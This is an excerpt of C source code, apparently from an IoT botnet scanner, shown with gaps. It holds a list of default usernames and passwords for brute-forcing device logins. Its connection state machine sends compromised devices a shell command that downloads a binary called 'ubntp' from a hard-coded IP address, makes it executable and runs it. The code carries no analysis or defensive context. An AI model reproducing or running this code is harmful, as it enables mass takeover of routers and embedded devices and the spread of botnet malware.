...
char *usernames[] = {"root\0", "admin\0", "user\0", "login\0", "guest\0", "support\0", "security\0", "read\0", "manager\0", "monitor\0", "tech\0", "debug\0", "apc\0", "Manager\0", "super\0", "ubnt\0", "echo\0", "sysadm\0", "pi\0"};
char *passwords[] = {"root\0", "toor\0", "admin\0", "user\0", "guest\0", "login\0", "changeme\0", "1234\0", "12345\0", "123456\0", "default\0", "pass\0", "password\0", "support\0", "apc\0", "ascend\0", "ubt\0", "security\0", "surt\0", "tini\0", "guest\0", "echo\0", "raspberry"};
        ...
        while(1)
        {
			...
			case 8:
				...
				break;
                        ...
                        case 9:
                                {
                                        if(send(fds[i].fd, "cd /tmp; wget -q http://185.62.190.104/ubntp; chmod 777 ubntp; ./ubntp; wget -q http://185.62.190.104/ubntp; chmod 777 ubntp; ./ubntp", 133, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 10;
                                }
                                break;
                        ...
                        case 10:
                                {
                                        if(send(fds[i].fd, "cd /tmp; wget -q http://185.62.190.104/ubntp; chmod 777 ubntp; ./ubntp; wget -q http://185.62.190.104/ubntp; chmod 777 ubntp; ./ubntp\r\n", 133, MSG_NOSIGNAL) < 0) { sclose(fds[i].fd); fds[i].state = 0; fds[i].complete = 1; continue; }
                                        fds[i].state = 11;
                                }
                                break;
